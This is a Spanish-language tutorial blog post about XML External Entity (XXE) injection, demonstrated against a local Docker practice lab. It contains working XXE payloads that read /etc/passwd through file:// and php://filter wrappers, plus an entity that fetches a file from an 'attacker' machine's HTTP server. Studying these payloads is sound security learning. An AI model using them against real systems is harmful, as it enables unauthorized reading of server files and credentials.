---
layout: single
title: Vulnerabilidad XXE - ¿Qué es y como se explota?
excerpt: "En este post explicaremos que es una vulnerabilidad XXE, Y como se puede explotar, utilizaremos un ejemplo en local para enetnder un poco mejor, y después de entender esto podemos pasar al siguiente post de la vulnerabilidad XXE para seguir practicando."
date: 2023-03-06
classes: wide
header:
  teaser: /assets/images/XXE/XXE.jpg
  teaser_home_page: true
#  icon: /assets/images/hackthebox.webp
categories:
  - vulnerabilidad web
tags:  
  - XXE
  - XML
---

<br>

**Índice de contenido**
- [¿Qué es XML?](#id1)
- [Ejemplo de entidad Genérica](#id2)
- [Montando el laboratorio con docker](#id3)
- [Continuando con el ejemplo de entidad Genérica](#id4)
- [Entidad Externa](#id5)
- [Entidad Externa ejemplo en Local](#id6)

<div id='id1' />

# ¿Qué es XML?

![XMLdraw](/assets/images/XXE/XMLdraw.png)

El Lenguaje de marcado extensible nos permite definir y guardar datos de forma compartible, y los datos que se transmiten son fácil de leer y facilita la transmisión de datos.

<br>

El XML tramita los datos en una estructura de árbol, similar a HTML, y los principales valores que se pasan son Etiquetas y Datos:

![Datags](/assets/images/XXE/datags.png)

<br>

Y aquí podemos ver un ejemplo de como viaja la petición y se interpreta:

![Peticion](/assets/images/XXE/peticion.png)

<br>

Ahora necesitamos saber que son las entidades, que son una forma de representar elementos de datos sin necesidad de hacer referencia a esos datos, esto se hace dentro de un documento XML.

Principalmente usaremos 3 tipos de entidades:

![entidades](/assets/images/XXE/entidades.png)

Vemos la definición de cada una de ellas, y aunque no te quede muy claro, ahora veremos ejemplos.

<br>

<div id='id2' />

# Ejemplo de entidad Genérica

Primero veremos la siguiente estructura de árbol XML:

```xml

<?xml version="1.0" encoding="UTF-8">
<nombre>Dansh</nombre>
<id>1</id>

```

Podemos ver que es una estructura XML básica, pero nos servirá para el ejemplo, en este caso esta estructura contiene las etiquetas **nombre** y **id**, con sus valores dentro definidos.

Esta entidad nos debería dar el resultado en pantalla que diga: nombre-Dansh id-1.

Ahora lo que vamos a hacer será agregar nuestra propia entidad, y la haremos agregando esta línea al código quedando así:

```xml

<?xml version="1.0" encoding="UTF-8">
<!DOCTYPE foo [ <!ENTITY name "Dan"> ]>
<nombre>&name;</nombre>
<id>1</id>

```

Como podemos ver, hemos agregado en la segunda línea eso que se muestra, lo que estamos haciendo es crear una entidad llamada **name** con el valor de "Dan".

Y podemos ver abajo que estamos haciendo referencia a la entidad llamada **name**, la cual tomara el valor y lo pondrá dentro de las etiquetas de donde ha sido llamada.

Y esta entidad anterior nos debería dar un resultado así: nombre-Dan id-1.

> Vemos que el valor de la etiqueta nombre ha cambiado, ya que hemos creado una entidad y la hemos usado en las etiquetas nombre para hacer referencia al valor de dicha entidad.

<div id='id3' />

# Montando el laboratorio con docker

Usaremos un laboratorio para practicar esta vulnerabilidad, primero nos clonaremos este repositorio:

https://github.com/jbarone/xxelab

Y después de clonar el repositorio lo que haremos es seguir estos pasos:

![instructions](/assets/images/XXE/instructions.png)

Y una vez tengamos el docker corriendo, accederemos al localhost por el puerto 5000, y veremos lo siguiente:

![sigin](/assets/images/XXE/sigin.png)

<div id='id4' />

# Continuando con el ejemplo de entidad Genérica

Podemos apreciar que vemos un panel de registro, así que pondremos datos y vamos a interceptar la petición para ver que encontramos:

![tree](/assets/images/XXE/tree.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<root>
		<name>Dansh</name>
		<tel>1254623</tel>
		<email>dansh@test.com</email>
		<password>Passw0rd123321</password>
	</root>
```

Podemos apreciar que toma los datos en el formato de estructura XML, podemos ver las etiquetas de los valores y sus valores dentro de ellas.

Dejaremos pasar la petición para ver que nos responde el servidor:

![response](/assets/images/XXE/response.png)

Y podemos ver que nos da el mensaje:

**Sorry, dansh@test.com is already registered!**

Por lo que podemos pensar que esta devolviendo la etiqueta de **email**, así que en base a eso intentaremos lo siguiente.

Vamos a insertar un DTD (Document Type Definition) en la estructura XML interceptada, y dentro del DTD haremos una entidad, quedando la estructura así:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY test "Hola"> ]>
	<root>
		<name>Dansh</name>
		<tel>1254623</tel>
		<email>&test;</email>
		<password>Passw0rd123321</password>
	</root>
```

Lo que hicimos primero fue agregar el DTD, y declarar una entidad llamada **test** con el valor de "Hola".

Después en la etiqueta de **email**, referenciamos a dicha entidad anteriormente declarada, y esto lo hacemos desde estas etiquetas, ya que como comprobamos antes desde esta etiqueta es donde recibimos una respuesta.

Ahora si tramitamos esta petición veremos lo siguiente:

![hola](/assets/images/XXE/hola.png)

Podemos apreciar que nos está dando el valor de nuestra entidad **test** por lo que sabemos que nos está interpretando el valor de la entidad.

<br>

<div id='id5' />

# Entidad Externa

Así que ahora que sabemos que esto funciona, haremos lo siguiente:

En vez de que la entidad contenga un valor asignado que no sirve de mucho, lo que haremos es leer algún archivo interno de la máquina que ejecuta el servidor web.

Para ello la estructura de la petición interceptada ahora la hicimos así:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY test SYSTEM "file:///etc/passwd"> ]>
	<root>
		<name>Dansh</name>
		<tel>1254623</tel>
		<email>&test;</email>
		<password>Passw0rd123321</password>
	</root>
```

Lo que ahora hicimos fue agregar el **SYSTEM** para que nos permita acceder a un servidor tercero del cual poder cargar datos, esto nos permitirá agregar url y hacer lo que hay en esa url, pero como las url también aceptan wrapper que son llamadas al sistema para hacer cierta función, en este caso usamos el wrapper "file://", el cual nos permite leer archivos internos de la máquina que ejecuta el servidor web, queremos leer el archivo /etc/passwd, por lo que se lo indicamos, y en teoría esto debería mostrarnos el contenido de ese archivo en la respuesta del servidor que veremos reflejado en la etiqueta **email**.

Así que al tramitar esta petición veremos lo siguiente:

![passwd](/assets/images/XXE/passwd.png)

Y vemos que nos ha leído el contenido de dicho archivo.

<br>

Existen varios wrappers por si alguno no te funciona debido a alguna restricción etc. por ejemplo, con este wrapper hace lo mismo que el anterior, pero te muestra todo en base64:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
	<root>
		<name>Dansh</name>
		<tel>1254623</tel>
		<email>&test;</email>
		<password>Passw0rd123321</password>
	</root>
```

Vemos que hemos usado el wrapper **php://filter/convert.base64-encode/resource=** y pasarle el archivo que queremos devolver en formato base64.

Y esto nos responderá algo así:

![base64](/assets/images/XXE/base64.png)

Y podemos apreciar que nos ha convertido el archivo /etc/passwd en base64.

Y podemos verificar que es este archivo, ya que al decodificarlo con algún decoder nos damos cuenta de que es el archivo:

![decoder](/assets/images/XXE/decoder.png)

Y podemos apreciar que si es el archivo ya decodificado.

> BurpSuite contiene su propio decoder de valores como base64, hexadecimal, etc.

<div id='id6' />

# Entidad Externa ejemplo en Local

Primero iniciaremos un servidor http en nuestra máquina atacante, por el puerto 80, lo que hará este servidor es crear un servidor compartido el cual podremos ver los archivos que estén en la ruta en la cual iniciamos el servidor, si vamos a **http://0.0.0.0:80/** que es el servidor localhost, pero por el puerto 80, Podremos confirmar que está funcionando el servidor:

![decoder](/assets/images/XXE/list.png)

Podemos apreciar que nos muestra la lista de archivos compartidos, a esto se le llama **directory listing**, una vez que confirmamos que funciona, haremos un archivo con datos XML, para después pasarlo al laboratorio local de pruebas y ver lo que sucede.

Primero crearemos el archivo dentro de la ruta donde iniciamos el servidor local docker:

![secreto](/assets/images/XXE/secreto.png)

Podemos apreciar que hemos creado un archivo llamado "test", y el valor de este archivo es el mensaje: "Mensaje secreto: 4848495290384", por ejemplo, una vez lo guardemos volvemos a iniciar el servidor de directory listing y podremos ver el archivo:

![file](/assets/images/XXE/file.png)

Y podemos apreciar que ya nos muestra el archivo, ahora tendremos que modificar nuestra petición así:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY test SYSTEM "http://192.168.1.70:80/test"> ]>
	<root>
		<name>Dansh</name>
		<tel>1254623</tel>
		<email>&test;</email>
		<password>Passw0rd123321</password>
	</root>
```

Lo que hicimos fue agregar la url de nuestra máquina atacante que levanto el servidor **directory listing** por el puerto 80, apuntando al archivo **test**, y al enviar la petición veremos lo siguiente:

![secret](/assets/images/XXE/secret.png)

Y como podemos ver en la respuesta de la petición vemos que nos interpreta el contenido del archivo **test**.

Y vemos el contenido que escribimos, en este punto el objetivo era demostrar que se puede acceder a archivos internos de un servidor por medio de este ataque.

También en vez de ser un archivo "test", podría ser algún documento que contenga código XML, indicando que nos lea algún archivo u otra cosa, pero esto será en el siguiente post.


Este post fue una introducción a XXE, ahora continuaremos en este tema en el siguiente post: [XXE (inyección de entidad externa - Laboratorios de PortSwigger)](https://dantedansh.github.io/XXE-laboratoriosPortSwigger/)
